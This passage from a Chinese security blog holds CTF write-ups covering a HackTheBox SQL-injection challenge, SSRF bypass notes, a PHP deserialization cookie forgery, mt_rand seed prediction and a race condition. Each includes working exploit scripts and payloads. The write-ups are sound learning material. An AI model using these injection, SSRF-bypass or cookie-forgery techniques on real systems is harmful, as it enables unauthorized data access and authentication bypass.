而传1&#39;触发报错，传1&quot;无报错。确认是存在sql注入漏洞，且是单引号闭合类型。于是，题目进入到了下一阶段，sql注入。显然为了让我们的payload更方便，最好先写好exp： 1234567891011121314import requestsimport jsonimport base64from bs4 import BeautifulSoupurl = \"http://docker.hackthebox.eu:30163/index.php?obj=\"payload=\"1\"payload = base64.b64encode(json.dumps(&#123;\"ID\": payload&#125;).encode('utf-8'))payload = str(payload, 'utf-8')url += payloadr = requests.get(url)soup = BeautifulSoup(r.text, 'html.parser')body = soup.find('body').text.strip()print(body) 于是通过FUZZ，发现存在不少过滤： 123456order by，concatinformation_schema.tableswherelimit 而且以上过滤都是正则匹配，没法用招数绕过，只能找替代。首先order by用group by代替，这点不难。得到字段数为2。逗号过滤就比较局限了，这意味着我们要么使用盲注，要么使用join注入。information_schema.tables在之前的swpuweb1中也见到过了，肯定存在对应的替代表可以让我们获取表名。但是where, concat,limit不太好解决。(其实到最后才发现，不需要应对这几个过滤)其中concat也许可以用make_set()起到连接字符串的效果。但是make_set()需要至少两个参数，也必须要逗号；而where等等过滤也不好办。 总之先从简单的开始吧，我选择使用盲注爆出数据库名与版本号。脚本如下： 12345678910111213141516171819for i in range(1,8): print(i) a=0 for j in range(95, 128): url = \"http://docker.hackthebox.eu:32614/index.php?obj=\" #10.3.20-MariaDB payload = \"1' and ascii(substr((select database()) from \"+str(i)+\" for 1))=\" + str(j) + \"#\" payload = base64.b64encode(json.dumps(&#123;\"ID\": payload&#125;).encode('utf-8')) payload = str(payload, 'utf-8') url += payload r = requests.get(url) soup = BeautifulSoup(r.text, 'html.parser') body = soup.find('body').text.strip() if 'Good' in body: flag += chr(j) print(flag) a=1 break if a==0: break 由于不需要绕其他过滤，只需要用select case from {0} for 1代替substr(case,{0},1)。然而盲注脚本只能解决这两个问题，得不到表名，而且还贼慢，我只能另寻其他方法注入表名。 考虑到逗号过滤时另一种方法，join注入，我们根据确认的两个字段数构造payload: 1payload&#x3D;&quot;1&#39; union select* from (select 1)a join (select 2)b#&quot; 结果出乎我意料之外，回显出现了 1Good Luck, You&#39;ve got that this is really gonna be an intersting challenge :)2 也就是说第二个字段有回显……所以其实不需要盲注，直接根据回显union select做就好了。所以下一步准备拿到表名，这里在我始终纠结于无法使用group_concat()要怎么拿到全部数据时，师傅的提示让我注意到了这里的报错函数： 1Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 34 这里的sql注入是通过mysqli_fetch_assoc()达成的，其返回值为：返回代表读取行的关联数组。所以不需要concat，也可以得到一行注入得到的全部数据。所以注入表名就不再担心那些问题，只要把information_schema.tables的代替找到就好(由于之前注入过版本，确认是10.3.20，可以用mysql.innodb_table_stats代替) 1payload &#x3D; &quot;&#39; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#&quot; 得到表名的连接字符串 1DATAFlagTableUnguessableEzPZgtid_slave_pos 接下来由于information_schema.columns找不到替代方式，看来是跟swpu一样的无列名注入了。之前文章里也写过，而此处的无列名注入稍有区别，属于未过滤`反引号，过滤掉逗号的情况。所以模板是： 10&#39; union select * from (select 1)a join (select &#96;2&#96; from (select * from (select 1)a join (select 2)b join (select 3)c union select * from &#39;表名&#39;)i )b # 实际上这道题目与第五届上海市大学生网络安全大赛 easysql十分相像，因此可以作为参考。下面一步就是要猜字段数跟表名了，首先判断表名，上网搜下发现mysql.gtid_slave_pos是一种系统表，所以估计最后一部分 gtid_slave_pos是一张表。之后按照这个模板不变，只改表名，发现Data是一张表。且内容就是我们之前回显的sql注入提示的内容，故刚好2个字段。那么估计flag就在FlagTableUnguessableEzPZ这张表了，而且猜测一张有flag表只有一列，所以改成一个字段试试 1payload=\"' UNION SELECT * FROM (SELECT 1)m JOIN (SELECT `1` from (select * from (select 1)a union select * from FlagTableUnguessableEzPZ)x )n#\" 成功拿到flag。 总结下吧，这算是一道很有营养的题目了。如果能根据报错发现后面的sql注入，就算跨过了一大步，这些主要是对php特性的理解。而我在sql注入这一步上倒是也卡了好久……不过题目很好的帮我再一次复习了无列名注入这个有意思的知识点，以及join绕过逗号这一经典方法。看来可以作为bypassinformation_schema的常规武器使用了。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"}]},{"title":"学习笔记-SSRF基础","slug":"学习笔记-SSRF基础","date":"2020-02-05T04:20:52.000Z","updated":"2021-02-18T05:08:46.733Z","comments":true,"path":"2020/02/05/学习笔记-SSRF基础/","link":"","permalink":"https://www.bycsec.top/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/","excerpt":"终于准备把欠了好久的SSRF学习记录一下了。最早接触SSRF是去年暑假，师傅给了我一道郁离歌出的入群题。当时对SSRF一无所知，东拼西凑才得到一个ip。可惜当时不知道是内网ip,最后涉及一个gopher打mysql的常见类型，最后也没能做出来。那之后也没有仔细做过ssrf题目，那我现在就来记录一下ssrf的学习笔记吧。","text":"终于准备把欠了好久的SSRF学习记录一下了。最早接触SSRF是去年暑假，师傅给了我一道郁离歌出的入群题。当时对SSRF一无所知，东拼西凑才得到一个ip。可惜当时不知道是内网ip,最后涉及一个gopher打mysql的常见类型，最后也没能做出来。那之后也没有仔细做过ssrf题目，那我现在就来记录一下ssrf的学习笔记吧。 1. SSRF ssrf全称为Server-side Request Forgery，即服务端请求伪造攻击。很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。 也就是说，ssrf的漏洞点在于：服务端提供了从其他服务器应用获取数据的功能，在用户可控的情况下，未对目标地址进行过滤与限制.常见场景包括但不仅限于： 1234567891.社交分享功能：获取超链接的标题等内容进行显示2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览3.在线翻译：给网址翻译对应网页的内容4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片#比如hgameweek25.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作...... 如果要从服务端的源码层面来讲，主要就是以下三种函数(php)： 1.file_get_contents() 1234567891011&lt;?phpif (isset($_POST['url'])) &#123; $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; &#125; echo $img; ?&gt; 常见的直接用file_get_contents()加载url指向文件2.fsockopen() 123456789101112131415161718192021&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo \"$errstr (error number $errno) \\n\"; &#125; else &#123; $out = \"GET $link HTTP/1.1\\r\\n\"; $out .= \"Host: $host\\r\\n\"; $out .= \"Connection: Close\\r\\n\\r\\n\"; $out .= \"\\r\\n\"; fwrite($fp, $out); $contents=''; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; 这个函数会使用socket跟服务器建立tcp连接，传输原始数据。 3.curl_exec() 12345678910111213141516&lt;?php if (isset($_POST['url']))&#123;$link = $_POST['url'];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = './curled/'.rand().'.txt';file_put_contents($filename, $result); echo $result;&#125;?&gt; 假如出现以上几种函数（已知源码前提下），通常可以尝试使用ssrf。 2.SSRF的利用实话说，ssrf不像sql，xss那样属于人尽皆知的漏洞。但其利用在真实渗透中是非常常见的。其利用场景主要有： 123456789101.让服务端去访问相应的网址(比如读&#x2F;flag之类的)2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms3.可以使用&#96;&#96;&#96;file、dict、gopher、ftp&#96;&#96;&#96;协议进行请求访问相应的文件(其中gopher被称作万金油，可以打内网也可以get,post,当然还有攻击内网未授权的mysql，主要区别在于不默认端口)4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）(ssrf打redis)5.攻击内网应用程序（利用跨协议通信技术）6.判断内网主机是否存活：方法是访问看是否有**端口开放**7.利用phar协议触发反序列化 CTF题目中具体见过的包括之前hackergame的一道伪ssrf（只涉及到url）；NCTF2019 True-XML-Cookbook以及hgame的Cosmos的博客后台（果然还是做得太少了） 3.绕过关于绕过，把重点放在几个大类上： 1）ip地址绕过对192.168.0.1 12348进制：0300.0250.0.116进制：0xC0.0xA8.0.110进####制：323223552116进制整数: 0xC0A80001 也可以通过省略达到同样的效果对10.0.0.1 12341.http:&#x2F;&#x2F;0&#x2F;2.http:&#x2F;&#x2F;127.1&#x2F;3.ipv6:http:&#x2F;&#x2F;[::1]&#x2F;4.http:&#x2F;&#x2F;127.0.0.1.&#x2F; 2)url bypass这应该是是基础类ssrf最常见的考点了，比较适合我这样的萌新总结。在谈及绕过之前，先来理解下url的基本概念：可以注意到url的组成部分。 1234567scheme 协议authority 权限&#x3D;主机名+端口号 ，再详细一点如![2.jpg](https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;18060177-6d443ccaaa9138ba.jpg?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240)admin:admin@www.example.com:2333&#96;（使用用户名为 admin，密码为 admin，访问 www.example.com 的 2333 端口获取资源）path 路径query 查询fragment 指向一个更低级别的资源 我们常常通过构造url来bypass个别函数，最终达成ssrf的目的。而orange的那篇经典的pdf指出了几个函数利用上的经典漏洞，其中离不开一个@： 12345php parse_url：host: 匹配最后一个@后面符合格式的hostlibcurl：host：匹配第一个@后面符合格式的host 利用@可以轻松使google.com（默认白名单）置为host，达到绕过php parse_url的效果（这里用#将@忽略了） 同样对于curl操作，假如使用libcurl则将第一个@后的危险网站置为执行curl的对象，达到漏洞利用。同样效果的还有;即http://evil.com;google.com。curl会将evil.com当成hostname,而将后面的google.com当做quqerystring。 提到curl,还可以提到后端代码的一种常见搭配 12341.filter_var对url进行check2.parse_url获取url的host3.对host进行正则匹配4.exec执行命令 12345678910111213141516171819&lt;?php echo \"Argument: \".$argv[1].\"\\n\"; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/google\\.com$/', $r['host'])) &#123; // get page from URL exec('curl -v -s \"'.$r['host'].'\"', $a); print_r($a); &#125; else &#123; echo \"Error: Host not allowed\"; &#125; &#125; else &#123; echo \"Error: Invalid URL\"; &#125;?&gt; 关于bypass filter_var及parse_url也是有妙招的：首先是 filter_var：上面说到，http://evil.com;google.com是可以执行curl到危险网站的。但是假如在curl之前加上filter_var后要怎么绕过呢？很简单，更改协议即可 10:&#x2F;&#x2F;evil.com;google.com 但是这样的话curl可能执行不了了，所以把hostname强调一下 10:&#x2F;&#x2F;evil.com:80;google.com:80 加上端口即可。 其次是parse_url：pase_url并不需要完全绕过hostname。因为parse_url的作用只是将一个给定url分成上面提到的scheme,hostname，port,path几部分。所以下面这个paylaod 10:&#x2F;&#x2F;evil$google.com 在经过parse_url后，hostname仍为evil$google.com。但是当源码中 1exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a); 执行时，bash会将后面的$google.com当做一个变量并置为空，所以exec()时仍是指向evil.com使用前提：用exec system执行curl wget之类的。 以上都是curl函数的ssrf，那么如果是file_get_contents()呢：比如只将上面exec()部分函数改为 12&#x2F;&#x2F; get page from URL$a &#x3D; file_get_contents($argv[1]); 这时就可以考虑到常常利用的各种协议,比如data协议 1data:&#x2F;&#x2F;google.com&#x2F;plain;base64,SSBsb3ZlIFBIUAo&#x3D; 12&#96;&#96;&#96;I love PHP 所以如果把后面的base64部分换作xss代码编码后的结果，就可以执行xss。 先这样。由于还没接触到ssrf的高级拓展场景，等日后接触到再写一篇高级利用。 参考文章： https://xz.aliyun.com/t/2115 https://skysec.top/2017/08/19/SSRF%E5%AD%A6%E4%B9%A0/ https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"杭电hgame-week3","slug":"杭电hgame-week3","date":"2020-02-02T10:27:44.000Z","updated":"2021-02-18T05:08:36.264Z","comments":true,"path":"2020/02/02/杭电hgame-week3/","link":"","permalink":"https://www.bycsec.top/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/","excerpt":"week3的难度更上一层楼。果不其然ak掉web的flag倒了，最后还是差一道题(其实是因为xss花了太多时间没做出来自闭了不想做了)总而言之收获不小，也头一次感受到高手切磋的意思。下个week估计不会再花这么多时间做题了。干脆写下欠着的笔记以及其他事吧。","text":"week3的难度更上一层楼。果不其然ak掉web的flag倒了，最后还是差一道题(其实是因为xss花了太多时间没做出来自闭了不想做了)总而言之收获不小，也头一次感受到高手切磋的意思。下个week估计不会再花这么多时间做题了。干脆写下欠着的笔记以及其他事吧。 序列之争 - Ordinal Scale其实这道反序列化应该是出给这个week的签到题，可惜自己太菜了……反序列化果然还是要好好研究一下啊。好在最后还是做出来了，而且还体会到不少反序列化的趣味性。看来是应该好好研究一番了：首先源码提示source.zip,我们看下源码中有用的部分：game.php(略掉无用部分) 123456789101112131415161718192021&lt;?php error_reporting(0); include_once('cardinal.php'); if(isset($_SESSION['player']))&#123; $playerName = $_SESSION['player']; &#125;else&#123; $playerName = $_POST['player'] ?? ''; if($playerName === '' || is_array($playerName))&#123; header('Location: index.php'); exit; &#125; &#125; $game = new Game($playerName);?&gt;当前排名: &lt;?php echo($game-&gt;rank-&gt;Get());?&gt; 经验: &lt;?php echo($_SESSION['exp']);?&gt; &lt;?php echo($game-&gt;welcomeMsg);?&gt; &lt;?php echo($game-&gt;rank-&gt;Get());?&gt; &lt;?php if($game-&gt;rank-&gt;Get() === 1)&#123;?&gt;hgame&#123;flag_is_here&#125; cardinal.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;?phperror_reporting(0);session_start();class Game&#123; private $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'; public $welcomeMsg = '%s, Welcome to Ordinal Scale!'; private $sign = ''; public $rank; public function __construct($playerName)&#123; $_SESSION['player'] = $playerName; if(!isset($_SESSION['exp']))&#123; $_SESSION['exp'] = 0; &#125; $data = [$playerName, $this-&gt;encryptKey]; $this-&gt;init($data); $this-&gt;monster = new Monster($this-&gt;sign); $this-&gt;rank = new Rank(); &#125; private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125; &#125;&#125;class Rank&#123; private $rank; private $serverKey; // 服务器的 Key private $key = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; public function __construct()&#123; if(!isset($_SESSION['rank']))&#123; $this-&gt;Set(rand(2, 1000)); return; &#125; $this-&gt;Set($_SESSION['rank']); &#125; public function Set($no)&#123; $this-&gt;rank = $no; &#125; public function Get()&#123; return $this-&gt;rank; &#125; public function Fight($monster)&#123; if($monster['no'] &gt;= $this-&gt;rank)&#123; $this-&gt;rank -= rand(5, 15); if($this-&gt;rank &lt;= 2)&#123; $this-&gt;rank = 2; &#125; $_SESSION['exp'] += rand(20, 200); return array( 'result' =&gt; true, 'msg' =&gt; '&lt;span style=\"color:green;\"&gt;Congratulations! You win! &lt;/span&gt;' ); &#125;else&#123; return array( 'result' =&gt; false, 'msg' =&gt; '&lt;span style=\"color:red;\"&gt;You die!&lt;/span&gt;' ); &#125; &#125; public function __destruct()&#123; // 确保程序是跑在服务器上的！ $this-&gt;serverKey = $_SERVER['key']; if($this-&gt;key === $this-&gt;serverKey)&#123; $_SESSION['rank'] = $this-&gt;rank; &#125;else&#123; // 非正常访问 session_start(); session_destroy(); setcookie('monster', ''); header('Location: index.php'); exit; &#125; &#125;&#125;class Monster&#123; private $monsterData; private $encryptKey; public function __construct($key)&#123; $this-&gt;encryptKey = $key; if(!isset($_COOKIE['monster']))&#123; $this-&gt;Set(); return; &#125; $monsterData = base64_decode($_COOKIE['monster']); if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); &#125;else&#123; session_start(); session_destroy(); setcookie('monster', ''); header('Location: index.php'); exit; &#125; &#125; $this-&gt;Set(); &#125; public function Set()&#123; $monsterName = ['无名小怪', 'BOSS: The Kernal Cosmos', '小怪: Big Eggplant', 'BOSS: The Mole King', 'BOSS: Zero Zone Witch']; $this-&gt;monsterData = array( 'name' =&gt; $monsterName[array_rand($monsterName, 1)], 'no' =&gt; rand(1, 2000), ); $this-&gt;Save(); &#125; public function Get()&#123; return $this-&gt;monsterData; &#125; private function Save()&#123; $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey); setcookie('monster', base64_encode(serialize($this-&gt;monsterData) . $sign)); &#125;&#125; 三个整齐的类，显然是php反序列化了。首先整理下思路，我们输入名字后开始游戏，这时只要$game-&gt;rank-&gt;Get() === 1即可拿到flag。那么首先跟随下流程吧。 重点先放在cardinal.php上。输入名字后，会实例化Game对象，而在Game类中，先后实例化Monster类与Rank类对象。其中monster类的实例化用到了一个init()函数。重点关注下这段代码 123456private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125; &#125; 这里的sprintf()函数可以利用。由于sprintf()作用是将格式化字符串写入变量中,第一次循环$playername有值，则将值写入%s，循环结束，如果循环的是%s则进入下一次循环。所以所谓的$encryptkey可以直接得到。输入名字为%s即可。这点是郁师傅提到，ddctf2019 web签到中出现过，包括下面一部分也跟那道题有关，所以我才能绕过这点。接着注意到下面,在循环过后，我们的循环结果$value经过了一次MD5,用于monster的实例化了。那么跟进monster类，发现重要代码 1234567891011121314$monsterData = base64_decode($_COOKIE['monster']); if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); &#125;else&#123; session_start(); session_destroy(); setcookie('monster', ''); header('Location: index.php'); exit; &#125; &#125; 原来monster是作为cookie被存储起来的，且只要我们的monstercookie满足条件，就有一个反序列化利用。所以关注下monoster的cookie的存储方式 1234private function Save()&#123; $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey); setcookie('monster', base64_encode(serialize($this-&gt;monsterData) . $sign)); &#125; 了解到加密方式，就明白了我们的反序列化生效方法了：我们输入名字后，伪造cookie，从而执行反序列化使Rank类中的$rank为1，拿到flag。所以exp如下，注意monster类中的$encryptley不是Game类中的的key。而是经过名字foreach后又md5了一下，传进Monster类中的；另外Rank类中的_destruct()也要绕过啊。我直接把destruct类扔掉后忘记改_construct()hh 1234567891011121314151617181920212223&lt;?phpclass Rank&#123; private $rank = 1; private $serverKey; private $key; public function __construct() &#123; $this-&gt;key = &amp;$this-&gt;serverKey; &#125;&#125;$Game_encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';$Game_data = ['byc_404', $Game_encryptKey];$Monster_encryptKey = '';foreach($Game_data as $key =&gt; $value)&#123; $Monster_encryptKey .= md5($Monster_encryptKey . $value);&#125;$a = new Rank();$sign = md5(serialize($a) . $Monster_encryptKey);$cookie = base64_encode(serialize($a) . $sign);echo $cookie; 二发入魂！有一说一，虽然这题第11个做出来挺高兴的，但是基本没啥收获。题目描述也不清楚，漏洞利用有点鸡肋，做题时完全化身脚本小子。总而言之不知道出题人的意图是啥，web题不该是这种类型的吧。 首先判断漏洞类型。进入页面发现抽卡数与cdkey这两个提交框。抽卡时会出现一大串随机数。cdkey没说明要提交啥。提交时会说明值错误或者慢于2s。打开源码发现提示php5，可以联想到是php5伪随机数漏洞(实际上各个版本的php都有这一漏洞，只不过5与7有区别)。之前在GWCTF上曾经作为web签到题做过，是关于mt_rand()这一函数的。漏洞即在于随机数钟子设定时，产生的随机数序列是固定的。故可以根据随机数序列倒推种子或者根据种子去推随机数序列。常常用以下代码测试： 1234mt_srand(123);for($i&#x3D;0;$i&lt;3;$i++)&#123; echo mt_rand().&quot; &quot;;&#125; 具体破解方法主要靠工具，即php_mt_seed，估记都用过。可以根据一个数倒推出各个php版本下的随机数种子。但是问题在于题目的种子显然是动态更新的，且基本不超过2s。相比GWCTF只跟session有关的静态种子，本题的更新速度迫使我们只能靠脚本解决。果断上google找相关文章，这篇文章吸引到我的注意：https://www.ambionics.io/blog/php-mt-rand-prediction文章的副标题说明，可以只通过两个值且并非暴力破解的方式得到种子。于是读了下文章，发现读不懂，纯算法层面。好在给出了脚本https://github.com/ambionics/mt_rand-reverse及使用方法里面一个php脚本用于生成随机数，其中两个参数一个为种子，另一个为偏移量，如果offset设为0，则输出的是以输入种子生成的第1个和第228个随机数；python脚本用于解随机数，共四个参数，前面php脚本生成的两个随机数，一个偏移量同上，加上一个值为0/1的用于判别php版本的参数。0为php5,1为php7 所以我尝试拿本地的一组数据在虚拟机里试下，发现很快能拿到结果种子123， 1python3 reverse_mt_rand.py 644748169 126568735 0 0 可能就是我要的脚本。所以思路如下，在脚本中给抽卡次数传为228，获取第一个和第227个随机数，传给脚本，另两个参数直接设为0 0执行，结果开始翻车。主要是自己不熟悉os库吧，想要直接在一个脚本里调用另一个脚本，虽然结果是对的但就是拿不到flag。于是直接改这个解密脚本(主要是把main()改成返回int值,原本是直接print的)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202import randomimport requestsimport reimport timetime_start=time.time()url = 'https://twoshot.hgame.n3ko.co/random.php?times=228'url1 = 'https://twoshot.hgame.n3ko.co/verify.php's = requests.session()res = s.get(url)key = res.textkey = key.replace('[', '')key = key.replace(']', ',')ans = re.findall(r'(.*?)\\,', key)arg1=ans[0]arg2=ans[227]print(arg1)print(arg2)#以下为原脚本N = 624M = 397MAX = 0xffffffffMOD = MAX + 1# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)STATE_MULT = 1812433253STATE_MULT_INV = 2520285293MT_RAND_MT19937 = 1MT_RAND_PHP = 0def php_mt_initialize(seed): \"\"\"Creates the initial state array from a seed. \"\"\" state = [None] * N state[0] = seed &amp; 0xffffffff; for i in range(1, N): r = state[i - 1] state[i] = (STATE_MULT * (r ^ (r &gt;&gt; 30)) + i) &amp; MAX return statedef undo_php_mt_initialize(s, p): \"\"\"From an initial state value `s` at position `p`, find out seed. \"\"\" # We have: # state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000 # and: # (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse) # =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000) for i in range(p, 0, -1): s = _undo_php_mt_initialize(s, i) return sdef _undo_php_mt_initialize(s, i): s = (STATE_MULT_INV * (s - i)) &amp; MAX return s ^ s &gt;&gt; 30def php_mt_rand(s1): \"\"\"Converts a merged state value `s1` into a random value, then sent to the user. \"\"\" s1 ^= (s1 &gt;&gt; 11) s1 ^= (s1 &lt;&lt; 7) &amp; 0x9d2c5680 s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 ^= (s1 &gt;&gt; 18) return s1def undo_php_mt_rand(s1): \"\"\"Retrieves the merged state value from the value sent to the user. \"\"\" s1 ^= (s1 &gt;&gt; 18) s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680) s1 ^= s1 &gt;&gt; 11 s1 ^= s1 &gt;&gt; 22 return s1def undo_lshift_xor_mask(v, shift, mask): \"\"\"r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask) \"\"\" for i in range(shift, 32, shift): v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i return vdef bits(v, start, size): return lobits(v &gt;&gt; start, size)def lobits(v, b): return v &amp; ((1 &lt;&lt; b) - 1)def bit(v, b): return v &amp; (1 &lt;&lt; b)def bv(v, b): return bit(v, b) &gt;&gt; bdef php_mt_reload(state, flavour): s = state for i in range(0, N - M): s[i] = _twist_php(s[i + M], s[i], s[i + 1], flavour) for i in range(N - M, N - 1): s[i] = _twist_php(s[i + M - N], s[i], s[i + 1], flavour)def _twist_php(m, u, v, flavour): \"\"\"Emulates the `twist` and `twist_php` #defines. \"\"\" mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) &amp; 1 else 0 return m ^ (((u &amp; 0x80000000) | (v &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ maskdef undo_php_mt_reload(S000, S227, offset, flavour): # define twist_php(m,u,v) (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU)) # m S000 # u S227 # v S228 X = S000 ^ S227 # This means the mask was applied, and as such that S227's LSB is 1 s22X_0 = bv(X, 31) # remove mask if present if s22X_0: X ^= 0x9908b0df # Another easy guess s227_31 = bv(X, 30) # remove bit if present if s227_31: X ^= 1 &lt;&lt; 30 # We're missing bit 0 and bit 31 here, so we have to try every possibility s228_1_30 = (X &lt;&lt; 1) for s228_0 in range(2): for s228_31 in range(2): if flavour == MT_RAND_MT19937 and s22X_0 != s228_0: continue s228 = s228_0 | s228_31 &lt;&lt; 31 | s228_1_30 # Check if the results are consistent with the known bits of s227 s227 = _undo_php_mt_initialize(s228, 228 + offset) if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0: continue if bv(s227, 31) != s227_31: continue # Check if the guessed seed yields S000 as its first scrambled state rand = undo_php_mt_initialize(s228, 228 + offset) state = php_mt_initialize(rand) php_mt_reload(state, flavour) if not (S000 == state[offset]): continue return rand return Nonedef main(_R000, _R227, offset, flavour): # Both were &gt;&gt; 1, so the leftmost byte is unknown _R000 &lt;&lt;= 1 _R227 &lt;&lt;= 1 for R000_0 in range(2): for R227_0 in range(2): R000 = _R000 | R000_0 R227 = _R227 | R227_0 S000 = undo_php_mt_rand(R000) S227 = undo_php_mt_rand(R227) seed = undo_php_mt_reload(S000, S227, offset, flavour) if seed: return seedseed=main(int(arg1), int(arg2), 0, 0)print(seed)data=&#123; 'ans':seed&#125;res1=s.post(url1,data)print(res1.text)time_end=time.time()print('totally cost',time_end-time_start) 为了方便我加了个计时器输出运行时间，可是貌似时间约0.3s左右时也没拿到flag。好在自己没放弃一直试，后面脚本运行时间差不多一直为0.18s左右时拿到flag了。可能一开始自己内存跑太满了吧…… ps:我错了。后来才发现这个洞很有用处。因为很多cms的cookie是直接mt_rand()生成的。所以伪造cookie是一种妙招 Cosmos的二手市场 有些丢脸。能做出来是靠师傅的提示。之前最大的问题主要在于没有辨析出漏洞所在，因此不好下手。像这类买卖东西的题目，我自己的认识主要来源于hackergame2019的达拉崩吧大冒险。当时里面漏洞之处在于自己的战斗力可以为负数，所以引申出负溢出。而这道题开始我也当成负溢出了，实际上是个多线程，或许叫条件竞争更为准确。 用burp重复发包卖东西，同时自己用python脚本不断买东西。只要burp的线程数快于python的，就可以保证金钱数在增加。pyhton脚本 1234567891011121314import requestsimport timeurl='http://121.36.88.65:9999//API/?method=buy'cookies=&#123;'PHPSESSID':'d0ov3vsd1hpjjf8ofuakhacd0n'&#125;headers=&#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'&#125;payload=&#123; 'code': '800002', 'amount': '30'&#125;for i in range(1,1000000): res=requests.post(url,data=payload,cookies=cookies,headers=headers) time.sleep(0.6) 比较菜，多线程忘光了，所以直接每次for循环用后sleep()一下。burp直接重复发包：最后多跑几遍，钱数够了后拿到flag Cosmos的留言板-2有点坑。题目坑不在难度上，主要是环境太差了，估计几个人一起注就要出问题。好在联系出题人重启了两遍总算能做了，毕竟都是用的学生机，能理解的。 